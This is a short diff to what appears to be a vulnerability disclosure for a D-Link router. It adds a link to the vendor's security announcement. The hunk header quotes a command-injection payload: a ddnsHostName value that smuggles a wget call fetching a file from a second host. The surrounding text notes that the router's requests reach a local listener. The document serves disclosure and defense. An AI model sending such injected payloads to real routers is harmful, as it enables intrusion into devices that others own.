@@ -71,3 +71,7 @@ ccp_act=doCheck&ddnsHostName=;wget${IFS}http://192.168.0.100:9988/doudou.txt;&dd
 ​	HTTP requests from routers can be received locally	
 
 ![image-20211219003729282](./img/image-20211219003729282.png)
+
+
+#### Official certification
+https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10264
